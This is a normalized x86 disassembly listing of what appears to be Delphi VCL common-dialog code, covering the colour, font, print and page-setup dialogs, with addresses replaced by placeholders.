mov eax [ ebp - 0x8 ]
call sub_40423c
cmp eax 0x3
jle r-xdata
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404288
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1 ] 0x3a
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2 ] 0x5c
je r-xdata
sub_432874
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43291f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5e ] 0x1
jne r-xdata
push ebp
mov eax [ edx + 0x1c ]
mov edx [ ebp - 0x8 ]
add edx 0x78
call sub_43272c
pop ecx
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
push ebp
mov eax [ edx + 0x1c ]
call sub_432774
pop ecx
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax 0x78
call sub_403fd0
jmp r-xdata
mov [ ebp - 0x1 ] 0x20
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432926
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
sub_43292c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
push 0x0
push esi
xor ecx ecx
xor edx edx
xor eax eax
call sub_41776c
test [ ebx + 0x5e ] 0x1
jne r-xdata
push esi
push edi
call GetClientRect
jmp r-xdata
push esi
push 0x45f
push edi
call GetDlgItem
push eax
call GetWindowRect
push 0x2
push esi
mov eax [ ebx + 0x3c ]
push eax
push 0x0
call MapWindowPoints
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_432980
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x78 ]
call sub_403fd0
cmp [ ebx + 0x3c ] 0x0
je r-xdata
mov eax esp
push eax
push 0x105
push 0x465
mov eax [ ebx + 0x3c ]
push eax
call GetParent
push eax
call SendMessageA
mov edx esi
mov eax esp
call sub_408b80
jmp r-xdata
add esp 0x108
pop esi
pop ebx
retn
sub_4329e8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov eax esi
call sub_40423c
mov ebx eax
cmp ebx 0x1
jle r-xdata
lea eax [ edi + 0x6c ]
push eax
mov ecx ebx
mov edx 0x1
mov eax esi
call sub_40449c
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40c7b8
test al al
je r-xdata
mov ecx ebx
dec ecx
mov edx esi
mov eax r-xdata
call sub_40c7ec
test al al
jne r-xdata
dec ebx
sub_432a8c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_431e44
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ esi + 0x60 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_432ad0
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x60 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_431e8c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_432b00
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
xor eax eax
push ebp
push sub_432b9d
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x44 ]
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebx ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_409070
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
mov edx esi
add dl 0x41
call sub_404164
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_404288
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x60 ]
pop ecx
call sub_41abd8
inc esi
add ebx 0x4
cmp esi 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432ba4
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403fa0
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_432bcc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
xor eax eax
push ebp
push sub_432c6a
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x44 ]
mov [ ebx ] 0xffffffff
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_404288
mov eax [ ebp - 0x10 ]
call sub_4082f8
mov [ ebx ] eax
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx esi
add dl 0x41
call sub_404164
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404288
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x60 ]
call sub_41a4f0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432c71
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fa0
retn
inc esi
add ebx 0x4
cmp esi 0x10
jne r-xdata
sub_432c8b
inc [ ecx ]
add [ eax ] al
add [ eax + eax ] ah
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
mov [ ebp - 0x4 ] eax
push ebp
call sub_432bcc
pop ecx
mov [ ebp - 0x68 ] 0x24
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_4242e8
mov [ ebp - 0x5c ] eax
lea eax [ ebp - 0x44 ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x54 ] 0x11
xor eax eax
mov edx rw-data
jae r-xdata
and ebx 0x7f
bt [ ecx + 0x5c ] ebx
inc eax
add edx 0x4
cmp al 0x5
jne r-xdata
mov ecx [ edx ]
or [ ebp - 0x54 ] ecx
mov ecx [ ebp - 0x4 ]
mov ebx eax
cmp bl 0x7
ja r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x4c ] sub_431ddc
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x68 ]
mov edx ChooseColorA
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
or [ ebp - 0x54 ] 0x20
mov [ ebp - 0x48 ] eax
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x5c ]
mov [ eax + 0x58 ] edx
push ebp
call sub_432b00
pop ecx
sub_432d5c
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
cmp eax 0x111
jne r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
push eax
push edx
call sub_431ddc
cmp [ ebp + 0x10 ] 0x402
jne r-xdata
cmp [ ebp + 0x12 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_432e70
mov eax 0x1
jmp r-xdata
pop ebp
retn 0x10
sub_432da0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_431e44
mov dl 0x1
mov eax [ r-xdata ]
call sub_4245d4
mov [ esi + 0x58 ] eax
mov ax [ r-xdata ]
mov [ esi + 0x5d ] ax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_432df2
add [ eax ] al
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x58 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_431e8c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_432e24
cmp [ edx ] 0x111
jne r-xdata
call sub_431f6c
retn
cmp [ edx + 0x6 ] 0x9
jne r-xdata
mov cx [ edx + 0x4 ]
cmp cx 0x473
jne r-xdata
cmp cx 0x474
jne r-xdata
mov [ eax + 0x71 ] 0x1
jmp r-xdata
mov [ eax + 0x70 ] 0x1
sub_432e70
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x40 ]
push eax
push 0x0
push 0x401
push ebx
call SendMessageA
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_4330d8
push 0x0
push 0x0
push 0x147
push 0x473
push ebx
call SendDlgItemMessageA
mov esi eax
cmp esi 0xffffffff
je r-xdata
xor eax eax
push ebp
push sub_432efb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffed
call sub_4033e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0x0
push esi
push 0x150
push 0x473
push ebx
call SendDlgItemMessageA
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_4247a8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432f1c
push ebp
mov ebp esp
add esp 0xffffff7c
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x84 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4330b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x44 ] 0x3c
xor eax eax
mov [ ebp - 0x3c ] eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
lea eax [ ebp - 0x80 ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x80 ]
push eax
push 0x3c
mov eax [ ebx + 0x58 ]
call sub_4247bc
push eax
call GetObjectA
lea eax [ ebp - 0x8 ]
lea edx [ ebp - 0x64 ]
mov ecx 0x20
call sub_4041ec
xor eax eax
mov al [ ebx + 0x5c ]
mov eax [ eax * 4 + rw-data ]
or eax 0x48
mov [ ebp - 0x30 ] eax
xor eax eax
mov esi rw-data
call sub_42f1b0
call sub_42ec20
mov [ ebp - 0x3c ] eax
jae r-xdata
and edx 0x7f
bt [ ebx + 0x5d ] edx
inc eax
add esi 0x4
cmp al 0x10
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x30 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
or [ ebp - 0x30 ] 0x200
mov eax [ ebx + 0x58 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] sub_432d5c
mov eax [ ebx + 0x68 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x6c ]
mov [ ebp - 0xc ] eax
cmp eax [ ebp - 0x10 ]
jge r-xdata
or [ ebp - 0x30 ] 0x10
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x40 ] eax
mov esi [ rw-data ]
mov [ rw-data ] ebx
mov [ ebx + 0x71 ] 0x0
mov [ ebx + 0x70 ] 0x0
lea ecx [ ebp - 0x44 ]
mov edx ChooseFontA
mov eax ebx
mov edi [ eax ]
call [ edi + 0x38 ]
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
mov [ rw-data ] esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
and [ ebp - 0x30 ] 0xffffdfff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4330bc
lea eax [ ebp - 0x84 ]
call sub_403f7c
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
lea eax [ ebp - 0x84 ]
lea edx [ ebp - 0x64 ]
mov ecx 0x20
call sub_4041ec
mov edx [ ebp - 0x84 ]
mov eax [ ebp - 0x8 ]
call sub_40804c
test eax eax
je r-xdata
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_4330d8
cmp [ ebx + 0x71 ] 0x0
je r-xdata
mov [ ebx + 0x70 ] 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx + 0x58 ]
call sub_4247a8
sub_4330d8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_433175
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
lea edx [ edi + 0x1c ]
mov ecx 0x20
call sub_4041ec
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_4249d0
mov edx [ edi ]
mov eax [ esi + 0x58 ]
call sub_424990
cmp [ esi + 0x70 ] 0x0
je r-xdata
mov bl [ r-xdata ]
cmp [ edi + 0x10 ] 0x190
jle r-xdata
mov dl [ edi + 0x17 ]
mov eax [ esi + 0x58 ]
call sub_424ad8
cmp [ edi + 0x14 ] 0x0
je r-xdata
or bl 0x1
cmp [ edi + 0x15 ] 0x0
je r-xdata
or bl 0x2
cmp [ edi + 0x16 ] 0x0
je r-xdata
or bl 0x4
mov edx ebx
mov eax [ esi + 0x58 ]
call sub_424a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43317c
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
or bl 0x8
sub_433188
push ebp
mov ebp esp
add esp 0xfffff3fc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
lea eax [ ebp - 0xc04 ]
push eax
push ebx
call sub_42f1b0
lea ecx [ ebp - 0x804 ]
lea edx [ ebp - 0x404 ]
call sub_42e930
cmp [ ebx ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x404 ]
call sub_408968
mov ebx eax
add ebx 0x8
lea eax [ ebp - 0x804 ]
call sub_408968
add ebx eax
lea eax [ ebp - 0xc04 ]
call sub_408968
add ebx eax
add ebx 0x3
push ebx
push 0x42
call GlobalAlloc
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalLock
mov esi eax
xor eax eax
push ebp
push sub_43327c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx esi
add ebx 0x8
mov edi esi
mov eax ebx
sub ax si
mov [ edi ] ax
lea edx [ ebp - 0x804 ]
mov eax ebx
call sub_4089cc
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x2 ] ax
lea edx [ ebp - 0x404 ]
mov eax ebx
call sub_4089cc
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x4 ] ax
lea edx [ ebp - 0xc04 ]
mov eax ebx
call sub_4089a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalUnlock
retn
sub_43328c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov ebx eax
xor eax eax
push ebp
push sub_4332f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi ebx
movzx eax [ esi + 0x4 ]
mov edi ebx
add eax edi
push eax
mov eax [ ebp - 0x4 ]
push eax
call sub_42f1b0
movzx ecx [ esi ]
add ecx edi
movzx edx [ esi + 0x2 ]
add edx edi
call sub_42e9d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4332ff
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalFree
retn
sub_433308
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GlobalSize
mov ebx eax
push ebx
push 0x42
call GlobalAlloc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor edx edx
push ebp
push sub_43338a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
push eax
call GlobalLock
mov esi eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
retn
test eax eax
je r-xdata
mov edx eax
mov eax esi
mov ecx ebx
call sub_402968
sub_4333a0
push ebx
add esp 0xffffffb8
mov ebx eax
lea eax [ esp + 0x4 ]
xor ecx ecx
mov edx 0x42
call sub_402bf8
mov [ esp + 0x4 ] 0x42
mov eax [ rw-data ]
mov [ esp + 0x26 ] eax
lea edx [ esp + 0x10 ]
mov eax esp
call sub_433188
mov eax [ esp ]
call sub_433308
mov [ esp + 0xc ] eax
mov [ esp + 0x18 ] 0x2040
mov [ esp + 0x32 ] sub_431ddc
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esp + 0x8 ] eax
lea ecx [ esp + 0x4 ]
mov edx PrintDlgA
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb eax eax
inc eax
mov ebx eax
test bl bl
je r-xdata
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
call sub_43328c
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push eax
call GlobalFree
mov eax ebx
add esp 0x48
pop ebx
retn
push eax
call GlobalFree
sub_433460
push ebx
push esi
push edi
add esp 0xffffffb8
mov edi eax
lea esi [ esp + 0x4 ]
mov eax esi
xor ecx ecx
mov edx 0x42
call sub_402bf8
mov [ esi ] 0x42
mov eax [ rw-data ]
mov [ esi + 0x22 ] eax
lea edx [ esi + 0xc ]
mov eax esp
call sub_433188
mov eax [ esp ]
call sub_433308
mov [ esi + 0x8 ] eax
xor eax eax
mov al [ edi + 0x63 ]
mov eax [ eax * 4 + rw-data ]
or eax 0x3000
mov [ esi + 0x14 ] eax
cmp [ edi + 0x60 ] 0x0
je r-xdata
test [ edi + 0x61 ] 0x1
jne r-xdata
add [ esi + 0x14 ] 0x10
test [ edi + 0x61 ] 0x2
jne r-xdata
add [ esi + 0x14 ] 0x100000
test [ edi + 0x61 ] 0x4
jne r-xdata
add [ esi + 0x14 ] 0x8
test [ edi + 0x61 ] 0x20
je r-xdata
add [ esi + 0x14 ] 0x4
cmp [ edi + 0x62 ] 0x0
je r-xdata
add [ esi + 0x14 ] 0x80000
test [ edi + 0x61 ] 0x10
je r-xdata
add [ esi + 0x14 ] 0x20
test [ edi + 0x61 ] 0x8
jne r-xdata
add [ esi + 0x14 ] 0x800
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
add [ esi + 0x14 ] 0x80
mov ax [ edi + 0x58 ]
mov [ esi + 0x18 ] ax
mov ax [ edi + 0x5c ]
mov [ esi + 0x1a ] ax
mov ax [ edi + 0x64 ]
mov [ esi + 0x1c ] ax
mov ax [ edi + 0x68 ]
mov [ esi + 0x1e ] ax
mov [ esi + 0x2a ] sub_431ddc
mov [ esi + 0x2e ] sub_431ddc
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x4 ] eax
mov ecx esi
mov edx PrintDlgA
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
or [ esi + 0x14 ] 0x4000
mov [ esi + 0x32 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
call sub_43328c
test [ esi + 0x14 ] 0x10
setne al
mov [ edi + 0x60 ] al
test [ esi + 0x14 ] 0x20
setne al
mov [ edi + 0x62 ] al
mov eax [ esi + 0x14 ]
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call GlobalFree
test al 0x2
je r-xdata
mov [ edi + 0x63 ] 0x1
jmp r-xdata
mov eax ebx
add esp 0x48
pop edi
pop esi
pop ebx
retn
push eax
call GlobalFree
mov [ edi + 0x63 ] 0x0
mov [ edi + 0x63 ] 0x2
jmp r-xdata
movzx eax [ esi + 0x18 ]
mov [ edi + 0x58 ] eax
movzx eax [ esi + 0x1a ]
mov [ edi + 0x5c ] eax
mov ax [ esi + 0x20 ]
cmp ax 0x1
jne r-xdata
movzx edx ax
mov eax edi
call sub_43344c
jmp r-xdata
call sub_42f1b0
call sub_42ec34
mov edx eax
mov eax edi
call sub_43344c
jmp r-xdata
sub_433608
push ebp
mov ebp esp
push ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4250c4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43366f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x10 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4257b8
cmp [ ebp + 0xa ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433676
mov eax [ ebp - 0x4 ]
call sub_4031ec
retn
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
dec eax
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ rw-data ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_43367c
push ebp
mov ebp esp
push ecx
push ebx
mov edx [ ebp + 0xc ]
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x10
mov [ ebp - 0x1 ] 0x0
cmp edx 0x400
jne r-xdata
add edx 0xfffffbff
cmp edx 0x5
ja r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xda ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x1 ]
jmp [ edx * 4 + jump_table_43372d ]
mov eax [ ebp + 0x10 ]
shr eax 0x10
mov edx eax
sub edx 0x1
je r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0x104 ]
push [ eax + 0x100 ]
call sub_433608
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0xf4 ]
push [ eax + 0xf0 ]
call sub_433608
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0x114 ]
push [ eax + 0x110 ]
call sub_433608
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0x10c ]
push [ eax + 0x108 ]
call sub_433608
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0xfc ]
push [ eax + 0xf8 ]
call sub_433608
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0xec ]
push [ eax + 0xe8 ]
call sub_433608
pop ecx
mov dl 0x1
sub edx 0x2
je r-xdata
sub edx 0x8
je r-xdata
sub edx 0xe
je r-xdata
xor edx edx
jmp r-xdata
and edx 0x7f
mov dl [ edx + rw-data ]
push edx
cmp eax 0xb
setg al
and eax 0x7f
mov al [ eax + rw-data ]
push eax
lea eax [ ebp - 0x1 ]
push eax
mov cx [ ebp + 0x10 ]
and cx 0xffff
mov ebx [ rw-data ]
mov edx [ rw-data ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
jmp r-xdata
sub_4337f0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_431e44
mov ax [ r-xdata ]
mov [ esi + 0x58 ] ax
mov eax esi
call sub_433a34
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_43383a
add [ eax ] al
push ebx
push esi
push edi
add esp 0xffffffe4
mov edi eax
lea eax [ edi + 0x84 ]
xor ecx ecx
mov edx 0x54
call sub_402bf8
lea esi [ edi + 0x84 ]
mov [ esi ] 0x54
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
mov [ esi + 0x3c ] eax
lea edx [ esi + 0xc ]
mov eax esp
call sub_433188
mov eax [ esp ]
call sub_433308
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] 0x400
lea eax [ edi + 0x84 ]
push eax
call PageSetupDlgA
mov [ esi + 0x10 ] 0x42002
mov al [ edi + 0xe0 ]
dec al
je r-xdata
add [ esi + 0x10 ] 0x8
dec al
jne r-xdata
test [ edi + 0x58 ] 0x2
je r-xdata
add [ esi + 0x10 ] 0x0
test [ edi + 0x58 ] 0x1
je r-xdata
add [ esi + 0x10 ] 0x4
jmp r-xdata
test [ edi + 0x58 ] 0x4
je r-xdata
add [ esi + 0x10 ] 0x10
test [ edi + 0x58 ] 0x8
je r-xdata
add [ esi + 0x10 ] 0x100
mov [ rw-data ] edi
mov [ esi + 0x48 ] sub_43367c
add [ esi + 0x10 ] 0x80000
jmp r-xdata
test [ edi + 0x58 ] 0x20
je r-xdata
add [ esi + 0x10 ] 0x200
test [ edi + 0x58 ] 0x10
je r-xdata
test [ edi + 0x58 ] 0x40
je r-xdata
add [ esi + 0x10 ] 0x20
test [ edi + 0x58 ] 0x80
je r-xdata
add [ esi + 0x10 ] 0x2
test [ edi + 0x59 ] 0x1
je r-xdata
inc [ esi + 0x10 ]
test [ edi + 0x59 ] 0x2
jne r-xdata
add [ esi + 0x10 ] 0x800
test [ edi + 0x59 ] 0x4
je r-xdata
add [ esi + 0x10 ] 0x80
lea ecx [ esp + 0x4 ]
mov edx [ edi + 0x80 ]
mov eax [ edi + 0x7c ]
call sub_417744
mov eax [ esp + 0x4 ]
mov [ esi + 0x14 ] eax
mov eax [ esp + 0x8 ]
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x68 ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx [ edi + 0x64 ]
mov edx [ edi + 0x60 ]
mov eax [ edi + 0x5c ]
call sub_41776c
push esi
push edi
lea edi [ esi + 0x1c ]
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ edi + 0x78 ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx [ edi + 0x74 ]
mov edx [ edi + 0x70 ]
mov eax [ edi + 0x6c ]
call sub_41776c
push esi
push edi
lea edi [ esi + 0x2c ]
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov [ esi + 0x44 ] sub_431ddc
lea ecx [ edi + 0x84 ]
mov edx PageSetupDlgA
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
add [ esi + 0x10 ] 0x200000
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
mov [ edi + 0x7c ] eax
mov eax [ esi + 0x18 ]
mov [ edi + 0x80 ] eax
mov eax [ esi + 0x2c ]
mov [ edi + 0x6c ] eax
mov eax [ esi + 0x30 ]
mov [ edi + 0x70 ] eax
mov eax [ esi + 0x34 ]
mov [ edi + 0x74 ] eax
mov eax [ esi + 0x38 ]
mov [ edi + 0x78 ] eax
mov edx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
call sub_43328c
jmp r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call GlobalFree
mov eax ebx
add esp 0x1c
pop edi
pop esi
